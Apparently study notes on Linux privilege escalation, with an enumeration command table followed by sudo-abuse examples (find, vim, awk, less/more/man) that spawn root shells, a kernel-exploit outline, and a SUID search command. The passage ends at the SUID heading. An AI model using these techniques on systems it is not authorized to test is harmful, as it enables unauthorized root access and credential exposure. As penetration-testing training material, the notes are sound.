- Identifying the system and environment (e.g., `hostname`, `uname -a`, `/etc/issue`)
- Reviewing running processes and permissions (e.g., `ps`, `id`, `sudo -l`)
- Investigating users, files, and history (e.g., `ls -la`, `/etc/passwd`, `history`)
- Exploring the network setup and connections (e.g., `ifconfig`, `netstat`, `ip route`)
- Locating tools, binaries, and sensitive files (e.g., `find`, `env`)

| **Command**                  | **Description**                                                                                              |     |
| ---------------------------- | ------------------------------------------------------------------------------------------------------------ | --- |
| `hostname`                   | Displays system hostname; can hint at machine's role (e.g., SQL-PROD-01).                                    |     |
| `uname -a`                   | Shows detailed system and kernel information.                                                                |     |
| `/proc/version`              | Provides kernel version and compiler info (via procfs). (`cat /proc/version`)                                |     |
| `/etc/issue`                 | Displays OS version (can be customized).(`cat /etc/issue`)                                                   |     |
| `ps -A`, `ps aux`, `ps axjf` | Lists running processes, users, and process trees.                                                           |     |
| `env`                        | Shows environment variables like `PATH` which may include useful binaries.                                   |     |
| `sudo -l`                    | Lists commands the user can run with elevated privileges via `sudo`.                                         |     |
| `ls -la`                     | Lists files in a directory, showing hidden and permission details.                                           |     |
| `id`                         | Displays user ID, group ID, and group memberships.                                                           |     |
| `/etc/passwd`                | Lists system users; useful for enumeration and brute-force targeting. (`cat /etc/passwd \| cut -d "." -f 1`) |     |
| `history`                    | Shows previously executed commands; may expose credentials.                                                  |     |
| `ifconfig`                   | Displays network interfaces and IP addresses.                                                                |     |
| `ip route`                   | Reveals routing table and potential reachable networks.                                                      |     |
| `netstat -a/n/l/tp/s/i`      | Shows open ports, connections, network statistics, and interface data.                                       |     |
| `find`                       | Searches files by name, size, permissions, timestamps, or ownership.                                         |     |
| `find / -perm -u=s`          | Locates files with the SUID bit set (potential privilege escalation).                                        |     |
| `find / -writable -type d`   | Finds world-writable directories.                                                                            |     |
| `find / -name python*`       | Finds installed development tools or interpreters.                

# Kernel Exploit
1. Identify the kernel version
2. Search and find an exploit code for the kernel version of the target system. Ex: [exploit-db](https://www.exploit-db.com/)
3. Run the exploit 

# Sudo 
In order to exploiting sudo users, first you need to find which commands current user is allowed, using the **_sudo -l_** command
```sh
#Example
User andrea may run the following commands on viserion:
 (root) NOPASSWD: /usr/bin/find
 (root) NOPASSWD: /usr/bin/vim
 (root) NOPASSWD: /usr/bin/awk
```

```sh
andrea@viserion:~$ sudo find /etc/passwd -exec /bin/sh \;
# whoami
root
```

or the **-c** paramether of **vim**:

```sh
andrea@viserion:~$ sudo vim -c '!sh'
# whoami
root
```

```sh
Also **awk** allows the invocation of a shell:

andrea@viserion:~$ sudo awk 'BEGIN {system("/bin/sh")}'
# whoami
root
```

and **less**, **more** and **man** allows command execution:

 ## MISCELLANEOUS COMMANDS

```sh
-<flag> Toggle a command line option [see OPTIONS below].
 --<name> Toggle a command line option, by name.
 _<flag> Display the setting of a command line option.
 __<name> Display the setting of an option, by name.
 +cmd Execute the less cmd each time a new file is examined.
 **!command Execute the shell command with $SHELL.**
 |Xcommand Pipe file between current pos & mark X to shell command.
 v Edit the current file with $VISUAL or $EDITOR.
 V Print version number of "less".
```
So, simply call:

```sh
sudo less /etc/hosts
# or
sudo more /etc/hosts
# or
sudo man ls
```

Then press _**!sh**_ and hit enter.

# SUID
`find / -type f -perm -04000 -ls 2>/dev/null` will list files that have SUID or SGID bits set.